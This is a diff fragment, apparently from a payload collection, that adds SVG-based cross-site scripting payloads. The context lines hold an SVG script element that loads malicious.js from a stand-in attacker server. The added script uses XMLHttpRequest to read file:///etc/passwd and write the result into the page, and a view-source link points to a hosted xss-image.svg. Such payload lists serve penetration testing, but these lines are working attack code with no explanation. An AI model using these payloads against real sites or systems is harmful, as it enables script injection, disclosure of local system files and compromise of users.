@@ -9,3 +9,15 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script href="http://your-malicious-server.com/malicious.js" />
 </svg>
+
+
+ 
+<?xml version="1.0" standalone="no"?>
+ 
+ 
+ 
+ 
+view-source:https://gist.githubusercontent.com/rudSarkar/76f1ce7a65c356a5cd71d058ab76a344/raw/cd34a78c963a9af5170a23b5df239b2b8eda6932/xss-image.svg
+ 
+<script>    exfil = new XMLHttpRequest();    exfil.open("GET","file:///etc/passwd");    exfil.send();    exfil.onload = function(){document.write(this.responseText);}    exfil.onerror = function(){document.write('failed!')}</script>
+ 
